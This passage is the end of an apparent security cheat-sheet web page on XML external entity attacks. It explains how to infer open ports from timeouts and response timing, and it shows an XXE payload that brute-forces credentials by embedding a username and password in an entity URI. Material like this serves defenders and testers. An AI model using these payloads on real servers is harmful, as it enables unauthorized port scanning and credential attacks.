<p><strong>3) Timeout-based</strong>: Timeouts could occur when connecting to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear.</p>
<p><strong>4) Time-based</strong>: Sometimes differences between closed and open ports are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host; then analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish when performed in higher latency networks.</p>
<h4 id="brute-forcing">Brute Forcing<a class="headerlink" href="#brute-forcing" title="Permanent link">&para;</a></h4>
<p>Once an attacker confirms that it is possible to perform a port scan, performing a brute force attack is a matter of embedding the <code>username</code> and <code>password</code> as part of the URI scheme (http, ftp, etc). For example the following :</p>
<pre><code class="xml">&lt;!DOCTYPE root [
 &lt;!ENTITY user SYSTEM &quot;http://username:password@example.com:8080&quot;&gt;
]&gt;
&lt;root&gt;&amp;user;&lt;/root&gt;
</code></pre>
              
            </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
      
        <a href="../XML_External_Entity_Prevention_Cheat_Sheet/" class="btn btn-neutral" title="XML External Entity Prevention Cheat Sheet"><span class="icon icon-circle-arrow-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
    
  </div>

  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
      
        </div>
      </div>

    </section>

  </div>

  <div class="rst-versions" role="note" aria-label="versions">
    <span class="rst-current-version" data-toggle="rst-current-version">
      
      
        <span><a href="../XML_External_Entity_Prevention_Cheat_Sheet/" style="color: #fcfcfc;">&laquo; Previous</a></span>
      
      
    </span>
</div>
    <script>var base_url = '../..';</script>
    <script src="../../js/theme.js" defer></script>
      <script src="../../search/main.js" defer></script>
    <script defer>
        window.onload = function () {
            SphinxRtdTheme.Navigation.enable(false);
        };
    </script>

</body>
</html>
